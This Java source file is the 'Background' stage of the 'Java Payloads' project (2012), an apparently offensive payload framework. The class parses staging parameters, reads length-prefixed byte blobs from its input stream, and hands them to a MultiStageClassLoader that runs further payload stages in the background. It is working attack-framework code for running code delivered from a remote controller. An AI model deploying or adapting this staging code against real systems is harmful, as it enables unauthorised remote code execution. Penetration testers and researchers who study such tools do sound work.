/*
 * Java Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.stage;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;

public class Background implements Stage {

	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
		boolean go = false;
		List /* <String> */stagerParameters = new ArrayList();
		List /* <String> */currentParameters = new ArrayList();
		for (int i = 0; i < parameters.length; i++) {
			if (!go) {
				stagerParameters.add(parameters[i]);
				if (parameters[i].equals("--")) {
					go = true;
					i++;
				}
				continue;
			}
			if (parameters[i].equals("---")) {
				currentParameters.addAll(0, stagerParameters);
				String[] params = (String[]) currentParameters.toArray(new String[currentParameters.size()]);
				currentParameters.clear();
				byte[] bytes = new byte[in.readInt()];
				in.readFully(bytes);
				new MultiStageClassLoader(params, new ByteArrayInputStream(bytes), new ByteArrayOutputStream(), true);
			} else if (parameters[i].startsWith("---")) {
				currentParameters.add(parameters[i].substring(1));
			} else {
				currentParameters.add(parameters[i]);
			}
		}
		currentParameters.addAll(0, stagerParameters);
		String[] params = (String[]) currentParameters.toArray(new String[currentParameters.size()]);
		new MultiStageClassLoader(params, in, out, false);
	}
}
